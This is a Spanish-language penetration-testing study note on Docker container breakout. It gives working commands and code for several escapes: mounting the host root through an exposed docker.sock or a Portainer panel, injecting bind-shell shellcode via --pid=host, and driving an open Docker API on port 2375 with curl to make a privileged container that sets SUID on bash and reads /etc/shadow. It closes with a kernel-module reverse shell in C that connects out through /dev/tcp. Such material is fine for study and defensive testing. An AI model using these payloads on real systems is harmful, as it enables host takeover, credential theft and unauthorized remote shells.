-----
- Tags: #teoria #escalada #practica 
-----

# Docker Breakout

El termino *docker breakout* hace referencia a la posibilidad que tiene un usuario legitimo o un atacante de escapar del container en el cual se encuentra, pudiendo así ganar acceso a la maquina host la cual ejecuta el container. Para realizar esto pueden existir diversas situaciones, algunas de ellas son: 

- ### Uso de monturas en el despliegue de contenedores para acceder a a archivos privilegiados del sistema host. Un atacante puede aprovecharse de las monturas para manipular los archivos del host  comprometer la seguridad del sistema. 

- ### Despliegue de contenedores con la compartición de procesos (**-pid=host**) y permisos privilegiados (**-privileged**). Un atacante podría inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema host.

- ### Uso de **Portainer** para administrar el despliegue de un contenedor. Un atacante podría ingresar y manipular archivos privilegiados del sistema host mediante el uso de monturas para así escapar del contenedor. 

- ### Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despligue de contenedores e inyección de comandos privilegiados en la máquina host. Un atacnte puede explotar esta API para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados. 

----

# Escalada 

## Demonio de docker enlazado con el contenedor por la ruta */var/run/docker.sock*

Cuando hacemos **docker ps** o **docker images**, se comunica con un archivo alojado en la ruta **/var/run/docker.sock** el cual es un socket file que nos permite comunicarnos con el demonio de docker cuando el servicio esta activo para poder ver la información deseada. 

Cual es el problema de esto? En principio ninguno, pero muchas veces en entornos de desarrollo por diversos motivos, cuando se crea un contenedor se necesita que el mismo tenga docker así como acceso a las imágenes creadas y los contenedores, por lo que muchas veces cuando se crea el contenedor de docker se suele hacer una montura de todo lo que existe en la ruta **/var/run/docker.sock** con la ruta del contenedor **/var/run/docker.sock**. 
(`docker run -v /var/run/docker.sock:/var/run/docker.sock ......`)

Por lo que el contenedor con docker (**apt install docker.io**) al realizar un **docker ps** o **docker images** podrá listar los contenedores y las imagenes de la maquina host (Por lo que podría verse a si mismo con **docker ps**), en lugar de recibir un error debido a que no se reconoce el servicio de docker y no se puede comunicar con la ruta **/var/run/docker.sock** (Que es lo que pasa en caso de que no se realice esta montura). 

De esta manera, tenemos una ruta (**/var/run/docker.sock**) que pertenece a la maquina host y al ser la ruta que permite comunicarnos con el servicio de docker para listar imágenes, crear contenedores, etc. podemos jugar con monturas para llevar a cabo el **docker breakout**. 

`docker run -dit --name breakout -v /:/mnt/root {image_name}` Con este comando, haciendo uso de una imagen disponible, estaríamos creando un nuevo contenedor con una montura de toda la raíz del sistema host en la ruta **/mnt/root**, por lo que de esta manera ya tendríamos acceso al sistema completo dentro de dicha ruta. 

-----

## Uso de --pid=host y --privileged o asignación de capabilities especificas 

#### Shellcode = Instrucción a bajo nivel. 

Cuando nos encontramos en un contenedor el cual fue creado con la flag **--pid=host** indica que si ejecutamos un **ps -faux** podemos ver los procesos de la maquina host, esto supone un riesgo ya que podríamos hacer uso de un PID de una tarea que ejecuta root para inyectar un shellcode para que nos cree un subproceso a partir del proceso, por lo que podríamos establecer una de las [[Shells]] (**Bind Shell**) mediante un shellcode (Siempre y cuando el contenedor tenga los permisos). 

Si buscamos en google un script que establezca un [shellcode mediante un proceso corriendo](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c) , podríamos utilizarlo para editarlo haciendo uso de otros shellcodes para establecer una tarea que querramos, por ejemplo un [shellcode para establecer una bind shell por el puerto 5600](https://www.exploit-db.com/exploits/41128).

De esta manera, una vez editado el shellcode (Modificando los bytes del shellcode y el shellcode mismo), simplemente podríamos compilar el binario y si tenemos los permisos necesarios, podríamos ejecutar el mismo el cual se encargara de crear un subproceso a través del proceso seleccionado, por lo que si todo sale bien se abrirá en el puerto 5600 un bind shell para que con netcat nos podamos conectar (**nc {target_ip} 5600**) y tener acceso como root a la maquina host. 

----

## Portainer 

**Portainer** es una herramienta que permite la administración y gestión de manera centralizada local o remota de docker, sean imagenes, contenedores, etc. Esta herramienta cuenta con un panel administrativo el cual en algunos casos podríamos encontrar en alguna máquina que estemos intentando vulnerar, por lo que podríamos realizar un ataque de fuerza bruta para ver si encontramos la contraseña y logramos ingresar al panel administrativo, de esta manera, una vez con acceso al panel administrativo, podríamos ver las imagenes y hacer uso de estas para crear un contenedor haciendo uso de esta y ver si existe la posibilidad de escapar del mismo, o incluso, realizar lo mismo que cuando el demonio de docker esta enlazado, ya que para que **portainer** tenga acceso a la información de las imagenes y demás tiene que poder ver el demonio de docker, y muchas veces este se monta en el contenedor de la sig. manera: `docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce
` 

Por lo que si obtenemos acceso al panel administrativo de portainer y creamos un contenedor haciendo uso de una imagen con la montura de **/:/mnt/root** una vez más, dentro de la ruta **/mnt/root*** tendríamos acceso al sistema, y esto abre una amplia variedad de posibilidades. 

----

## Abusando de la API de Docker 

Esto es algo que por default no suele estar activado, pero muchas veces puede ser que nos encontremos con esto. 
Para activar la API de Docker, nos dirigimos al directorio **/etc/docker** y creamos un archivo llamado **daemon.json** con el contenido: 

```json
{"hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]}
```

Agregamos el archivo **/etc/systemd/system/docker.service.d/override.conf** : 

```conf
[Service]
ExecStart= 
ExecStart=/usr/bin/dockerd
```

Y por ultimo recargamos el demonio  *systemctl daemon-reload* y restartiamos el servicio de docker *systemctl restart docker.service*. 

Una vez que tengamos la API corriendo ya podríamos probar esto de manera local. 

Cuando ganamos acceso a un contenedor y probamos diversas maneras de intentar escapar del contenedor, tal vez ninguna de las anteriores den resultado. Por lo que podríamos verificar si el puerto 2375 o 2376 esta abierto en lo que sería la maquina host.

Por ejemplo, si somos la máquina **172.17.0.2** intuimos que la máquina host es la **0.1** por lo que podríamos verificar si uno de los puertos anteriores está abierto.

```bash
echo '' > /dev/tcp/172.17.0.1/2375 

echo $? 
```

Si no vemos respuesta alguna en la consola y al ejecutar **echo $?** vemos que el código de estado es un 0, quiere decir que el puerto esta abierto, por lo que muy probablemente este corriendo docker. En este caso, podríamos realizar el proceso de enumeración y creación de contenedores haciendo uso de páginas como [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker). 

# Payloads: 

- **Listar containers desde consola con CURL usando la API:** `curl http://{ip}:2375/containers/json | jq`
- **Listar imágenes  desde consola con CURL usando la API:** `curl http://{ip}:2375/images/json | jq`
- **Listar containers desde consola con CURL usando la API:** `curl http://{ip}:2375/containers/json | jq`
- **Crear un container** `curl  -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/create?name={container_name} -d '{"Image":"{image_name}", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt/root" ], "Privileged": true}'` (Esto nos devolverá un ID_container)
- **Startear el container creado:** `curl -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/{ID_container}/start?name={container_name}`
- **Crear ejecución de un comando:** `curl -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/{ID_container}/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/root/bin/bash"]}'` (Esto nos devolverá un ID_command y en caso de que el comando que querramos ejecutar sea algo lo cual nos tenga que mostrar output como un cat al /etc/shadow deberíamos agregar un `--ouput -`)
- **Ejecutar el comando creado:** `curl -X POST -H "Content-Type: application/json" http://{ip}:2375/exec/{ID_command}/start -d '{}'` 

De esta manera, si vemos que la API de docker esta activa en la máquina host, podríamos crear un contenedor como lo haríamos normalmente desde consola y manipular el contenido de la máquina host, pudiendo leer el etc/shadow, agregando el permiso SUID a la bash, etc. 

------
# Cap sys_module 

En caso de ejecutar un **linpeas.sh**, o listar de manera manual las capabilities con `capsh --print` y localizar que el contenedor contiene la capabilitie **sys_module**, como resultado el contenedor puede insertar y/o remover modules del kerner en la máquina host del contenedor. 

Una vez con la IP de la máquina host, haríamos uso del siguiente script en **c**.

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
static int __init reverse_shell_init(void) {
return call_usermodelhelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Ahora habría que crear un archivotarget **makefile**:

```Makefile
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Ejecutamos el comando `make`, luego podríamos proceder a ponernos en escucha por el puerto aclarado en la máquina host (O donde querramos envíar la reverse shell).

Ejecutamos el comando `insmod reverse-shell.ko`, y al hacerlo se ejecutaría el comando ingresado, en este caso en las primeras líneas del archivo **c** se indicio `/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'





